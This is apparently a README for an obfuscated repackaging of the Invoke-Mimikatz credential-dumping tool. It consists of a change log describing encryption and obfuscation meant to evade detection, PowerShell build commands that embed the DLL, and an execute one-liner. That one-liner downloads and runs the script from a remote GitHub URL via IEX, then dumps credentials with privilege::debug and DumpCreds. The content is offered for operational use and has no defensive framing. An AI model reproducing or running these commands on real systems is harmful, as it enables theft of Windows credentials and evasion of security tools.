### Change Log


- New Powercatz.dll (32bit & 64bit)
- Compressed and encrypted with random iterations
- base64 then reversed
- Obfuscated functions, variables and parameters


### BUILD

```Powershell
cd $env:UserProfile\Desktop\Powerkatz
Import-Module .\Invoke-UpdateMimikatzScript.ps1 
Invoke-UpdateMimikatzScript -DllPath $env:UserProfile\Desktop\Powerkatz\x64\powerkatz.dll -ScriptPath $env:UserProfile\Desktop\Powerkatz\Invoke-Mimikatz.ps1
Invoke-UpdateMimikatzScript -DllPath $env:UserProfile\Desktop\Powerkatz\win32\powerkatz.dll -ScriptPath $env:UserProfile\Desktop\Powerkatz\Invoke-Mimikatz.ps1
```

### EXECUTE

```PowerShell
# Execute
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/idratherbestealing/mimikatz/main/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;
```
